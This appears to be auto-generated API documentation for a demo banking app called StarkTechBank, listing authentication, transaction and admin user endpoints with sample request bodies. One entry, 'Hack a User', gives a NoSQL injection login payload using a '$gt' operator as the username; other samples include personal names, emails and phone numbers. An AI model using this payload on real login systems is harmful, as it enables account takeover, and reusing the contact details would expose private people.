
# StarkTechBank



## Indices

* [Authentication](#authentication)

  * [Forgot Password](#1-forgot-password)
  * [Get Logged in User via Token](#2-get-logged-in-user-via-token)
  * [Hack a User](#3-hack-a-user)
  * [Login User](#4-login-user)
  * [Logout User](#5-logout-user)
  * [Register User](#6-register-user)
  * [Register User](#7-register-user)
  * [Reset Password](#8-reset-password)
  * [Update User Details](#9-update-user-details)

* [PrimaryTransaction](#primarytransaction)

  * [Primary Account Deposit](#1-primary-account-deposit)
  * [Primary Account Withdrawal](#2-primary-account-withdrawal)

* [SavingsTransaction](#savingstransaction)

  * [Savings Account Deposit](#1-savings-account-deposit)
  * [Savings Account Withdrawal](#2-savings-account-withdrawal)

* [Users](#users)

  * [Create User](#1-create-user)
  * [Delete a User](#2-delete-a-user)
  * [Get a User](#3-get-a-user)
  * [Get all Users](#4-get-all-users)
  * [Update a User](#5-update-a-user)


--------


## Authentication



### 1. Forgot Password


Generate password token and send email


***Endpoint:***

```bash
Method: POST
Type: RAW
URL: {{URL}}/api/v1/auth/forgotpassword
```


***Headers:***

| Key | Value | Description |
| --- | ------|-------------|
| Content-Type | application/json |  |



***Body:***

```js        
{
    "email": "adebabesemedeton@gmail.com"
}
```



### 2. Get Logged in User via Token



***Endpoint:***

```bash
Method: GET
Type: RAW
URL: {{URL}}/api/v1/auth/me
```


***Headers:***

| Key | Value | Description |
| --- | ------|-------------|
| Content-Type | application/json |  |



### 3. Hack a User


Hack a user by guessing a correct password and set empty userName


***Endpoint:***

```bash
Method: POST
Type: RAW
URL: {{URL}}/api/v1/auth/login
```


***Headers:***

| Key | Value | Description |
| --- | ------|-------------|
| Content-Type | application/json | JSON Type |



***Body:***

```js        
{
    "userName": {"$gt":""},
    "password": "1234567"
}
```



### 4. Login User



***Endpoint:***

```bash
Method: POST
Type: RAW
URL: {{URL}}/api/v1/auth/login
```


***Headers:***

| Key | Value | Description |
| --- | ------|-------------|
| Content-Type | application/json | JSON Type |



***Body:***

```js        
{
    "userName": "oyedotunsodiq045",
    "password": "123456"
}
```



### 5. Logout User


Clear user token


***Endpoint:***

```bash
Method: GET
Type: RAW
URL: {{URL}}/api/v1/auth/logout
```


***Headers:***

| Key | Value | Description |
| --- | ------|-------------|
| Content-Type | application/json |  |



### 6. Register User


Register a User
    * Creates Savings Account
    * Creates Current Account


***Endpoint:***

```bash
Method: POST
Type: RAW
URL: {{URL}}/api/v1/auth/register
```


***Headers:***

| Key | Value | Description |
| --- | ------|-------------|
| Content-Type | application/json | JSON Type |



***Body:***

```js        
{
    "userName": "ifeoye",
    "firstName": "Ifeoluwa",
    "lastName": "Adebabe",
    "email": "adebabesemedeton@gmail.com",
    "phone": "08189414781",
    "password": "123456"
}
```



### 7. Register User


Register a User
    * Creates Savings Account
    * Creates Current Account


***Endpoint:***

```bash
Method: POST
Type: RAW
URL: {{URL}}/api/v1/auth/register
```


***Headers:***

| Key | Value | Description |
| --- | ------|-------------|
| Content-Type | application/json | JSON Type |



***Body:***

```js        
{
    "userName": "oyedotunsodiq045",
    "firstName": "Sodiq",
    "lastName": "Oyedotun",
    "email": "oyedotunsodiq045@gmail.com",
    "phone": "08175044840",
    "password": "123456"
}
```



### 8. Reset Password


Reset user password using token


***Endpoint:***

```bash
Method: PUT
Type: RAW
URL: {{URL}}/api/v1/auth/resetpassword/1b8754f8d518961685b3fa4a6236b91b5477cb56
```


***Headers:***

| Key | Value | Description |
| --- | ------|-------------|
| Content-Type | application/json | JSON Type |



***Body:***

```js        
{
    "password": "1234567"
}
```



### 9. Update User Details



***Endpoint:***

```bash
Method: PUT
Type: RAW
URL: {{URL}}/api/v1/auth/updatedetails
```


***Headers:***

| Key | Value | Description |
| --- | ------|-------------|
| Content-Type | application/json |  |



***Body:***

```js        
{
    "userName": "oyedotunsodiq045",
    "firstName": "Sodiq",
    "lastName": "Oyedotun",
    "email": "oyedotunsodiq045@gmail.com",
    "phone": "08175044840"
}
```



## PrimaryTransaction



### 1. Primary Account Deposit



***Endpoint:***

```bash
Method: POST
Type: RAW
URL: {{URL}}/api/v1/primaryTransactions/deposit
```


***Headers:***

| Key | Value | Description |
| --- | ------|-------------|
| Content-Type | application/json |  |



***Body:***

```js        
{
    "description": "Primary Account Deposit",
    "type": "Primary",
    "amount": 1000
}
```



### 2. Primary Account Withdrawal



***Endpoint:***

```bash
Method: POST
Type: RAW
URL: {{URL}}/api/v1/primaryTransactions/withdraw
```


***Headers:***

| Key | Value | Description |
| --- | ------|-------------|
| Content-Type | application/json |  |



***Body:***

```js        
{
    "description": "Primary Account Withdrawal",
    "type": "Primary",
    "amount": 10
}
```



## SavingsTransaction



### 1. Savings Account Deposit



***Endpoint:***

```bash
Method: POST
Type: RAW
URL: {{URL}}/api/v1/savingsTransactions/deposit
```


***Headers:***

| Key | Value | Description |
| --- | ------|-------------|
| Content-Type | application/json |  |



***Body:***

```js        
{
    "description": "Savings Account Deposit",
    "type": "Savings",
    "amount": 1000
}
```



### 2. Savings Account Withdrawal



***Endpoint:***

```bash
Method: POST
Type: RAW
URL: {{URL}}/api/v1/savingsTransactions/withdraw
```


***Headers:***

| Key | Value | Description |
| --- | ------|-------------|
| Content-Type | application/json |  |



***Body:***

```js        
{
    "description": "Savings Account Withdrawal",
    "type": "Savings",
    "amount": 477
}
```



## Users



### 1. Create User


Add user to database (admin)


***Endpoint:***

```bash
Method: POST
Type: RAW
URL: {{URL}}/api/v1/users
```


***Headers:***

| Key | Value | Description |
| --- | ------|-------------|
| Content-Type | application/json | JSON Type |



***Body:***

```js        
{
    "userName": "test",
    "firstName": "Test",
    "lastName": "Microphone",
    "email": "test@gmail.com",
    "phone": "08123456789",
    "password": "123456"
}
```



### 2. Delete a User


Delete a user from database (admin)


***Endpoint:***

```bash
Method: DELETE
Type: 
URL: {{URL}}/api/v1/users/5f7e592e078929412a34a955
```


***Headers:***

| Key | Value | Description |
| --- | ------|-------------|
| Content-Type | application/json |  |



### 3. Get a User


Get a user by id (admin)


***Endpoint:***

```bash
Method: GET
Type: 
URL: {{URL}}/api/v1/users/5f7df53b25f6723e4802cf2f
```



### 4. Get all Users


Get all users (admin)


***Endpoint:***

```bash
Method: GET
Type: 
URL: {{URL}}/api/v1/users
```



### 5. Update a User


Update a user by id (admin)


***Endpoint:***

```bash
Method: PUT
Type: RAW
URL: {{URL}}/api/v1/users/5f7df53b25f6723e4802cf2f
```


***Headers:***

| Key | Value | Description |
| --- | ------|-------------|
| Content-Type | application/json |  |



***Body:***

```js        
{
    "email": "adebabesemedeton@gmail.com"
}
```



---
[Back to top](#starktechbank)
> Made with &#9829; by [thedevsaddam](https://github.com/thedevsaddam) | Generated at: 2020-10-08 17:31:17 by [docgen](https://github.com/thedevsaddam/docgen)
